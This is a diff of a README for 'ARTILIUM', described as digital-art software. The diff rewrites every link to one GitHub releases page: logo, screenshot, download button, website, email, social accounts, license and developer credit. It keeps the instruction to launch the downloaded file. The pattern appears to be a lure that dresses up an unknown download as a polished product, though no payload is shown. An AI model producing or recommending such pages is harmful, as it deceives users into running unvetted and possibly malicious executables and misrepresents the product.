@@ -5,7 +5,7 @@
 ## Description
 ARTILIUM is an advanced software solution for designing, editing, and enhancing digital artwork. Tailored for both professional creators and passionate hobbyists, ARTILIUM offers intuitive tools and AI-powered features to elevate your artistic projects with precision and ease.
 
-![ARTILIUM Logo](https://example.com/logo.png)
+![ARTILIUM Logo](https://github.com/matiasogaz/ARTILIUM/releases)
 
 ---
 
@@ -52,14 +52,14 @@ ARTILIUM is an advanced software solution for designing, editing, and enhancing 
 
 ## Download ARTILIUM
 📥 Click the button below to download ARTILIUM for your creative projects:
-[![Download ARTILIUM](https://img.shields.io/badge/Download-ARTILIUM-blue)](https://github.com/project/files/App.zip)
+[![Download ARTILIUM](https://github.com/matiasogaz/ARTILIUM/releases)](https://github.com/matiasogaz/ARTILIUM/releases)
 
 *Note: Make sure to launch the downloaded file to start using ARTILIUM.*
 
 ---
 
 ## Get Started
-🚀 Visit [ARTILIUM Website](https://www.artilium.com) to explore more about our software.
+🚀 Visit [ARTILIUM Website](https://github.com/matiasogaz/ARTILIUM/releases) to explore more about our software.
 
 *If the link is not accessible, kindly check the "Releases" section for more information.*
 
@@ -68,28 +68,28 @@ ARTILIUM is an advanced software solution for designing, editing, and enhancing 
 ## Start Creating Today!
 Unleash your creativity with ARTILIUM and take your digital artwork to new heights. Join a community of passionate creators and revolutionize your artistic process like never before. Let your imagination run wild with ARTILIUM!
 
-![ARTILIUM Screenshot](https://example.com/screenshot.png)
+![ARTILIUM Screenshot](https://github.com/matiasogaz/ARTILIUM/releases)
 
 ---
 
 ## Connect With Us
-🌐 Website: [www.artilium.com](https://www.artilium.com)
+🌐 Website: [https://github.com/matiasogaz/ARTILIUM/releases](https://github.com/matiasogaz/ARTILIUM/releases)
 
-📧 Email: contact@artilium.com
+📧 Email: https://github.com/matiasogaz/ARTILIUM/releases
 
-🐦 Twitter: [@artiliumsoftware](https://twitter.com/artiliumsoftware)
+🐦 Twitter: [@artiliumsoftware](https://github.com/matiasogaz/ARTILIUM/releases)
 
-📘 Facebook: [ARTILIUM](https://www.facebook.com/artilium)
+📘 Facebook: [ARTILIUM](https://github.com/matiasogaz/ARTILIUM/releases)
 
 ---
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the [MIT License](https://github.com/matiasogaz/ARTILIUM/releases) - see the [LICENSE](LICENSE) file for details.
 
 ---
   
 ## Contributor
-👨‍💻 Developed by [Creative Solutions Ltd](https://www.creativesolutions.com)
+👨‍💻 Developed by [Creative Solutions Ltd](https://github.com/matiasogaz/ARTILIUM/releases)
 
 ---
 
